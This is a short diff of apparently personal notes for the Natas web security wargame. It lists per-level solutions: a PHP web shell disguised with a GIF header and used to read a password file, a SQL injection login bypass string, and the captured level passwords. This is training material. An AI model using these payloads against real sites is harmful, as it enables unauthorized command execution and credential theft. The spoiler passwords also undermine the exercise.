@@ -43,9 +43,11 @@ N13 --> Create a jpg file with GIF89a <?php system($_GET['cmd']); ?>, Intercept 
 --- add cmd = /etc/natas_webpass/natas14 in url
   N14 --> z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
-N14 --> 
-  N15 -->
+N14 --> "OR "1"="1
+  N15 --> SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 
+N15 -->
+  N16 -->
 
 
 
